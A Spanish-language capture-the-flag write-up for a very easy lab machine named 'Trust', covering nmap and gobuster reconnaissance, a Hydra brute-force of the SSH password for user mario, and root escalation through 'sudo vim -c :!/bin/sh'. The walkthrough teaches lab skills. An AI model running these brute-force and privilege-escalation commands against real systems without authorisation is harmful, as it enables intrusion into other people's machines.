---
description: >-
  ✍️ Autor: El Pingüino de Mario🔍 Dificultad: Muy Fácil  📅 Fecha de creación:
  02/04/2024
---

# Trust

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.22.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/0 (3).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.22.0.2 -oG allPorts
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

![](<../../.gitbook/assets/1 (3).png>)

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 172.22.0.2
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/2 (3).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagaremos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web sea un formulario de iniciar sesión.

![](<../../.gitbook/assets/3 (3).png>)

Ahora, buscamos directorios con la herramienta **Gobuster** a través del comando:

```bash
gobuster dir -u http://172.22.0.2/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -t 20 -x html,php,txt,js
```

<figure><img src="../../.gitbook/assets/4 (3).png" alt=""><figcaption></figcaption></figure>

Vemos que hay dos directorios con estado **200**, lo que significa que la solicitud realizada por el cliente fue exitosa. Procederemos a investigar más sobre estos directorios.

<figure><img src="../../.gitbook/assets/5 (3).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Con la información obtenida anteriormente, realizamos el comando:

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.22.0.2 -t 5
```

Este comando utiliza la herramienta **Hydra** para realizar un ataque de fuerza bruta contra el servicio SSH de una máquina con la IP **172.22.0.2**.

<figure><img src="../../.gitbook/assets/6 (2).png" alt=""><figcaption></figcaption></figure>

Al realizar el ataque de fuerza bruta, descubrimos la contraseña de **mario**. Sabiendo esto, nos conectamos a través de SSH al usuario con el comando:

```bash
ssh mario@172.22.0.2
```

<figure><img src="../../.gitbook/assets/7 (2).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que ejecutamos:

```bash
sudo -l
```

para ver si hay algo que podamos explotar.

![](<../../.gitbook/assets/8 (2).png>)

Observamos que podemos escalar privilegios con **vim** utilizando el comando:

```bash
sudo vim -c ':!/bin/sh'
```

Tras eso, ejecutamos:

```bash
whoami
```

y confirmamos que ya somos **root**.

<figure><img src="../../.gitbook/assets/image (575).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (576).png" alt=""><figcaption></figcaption></figure>
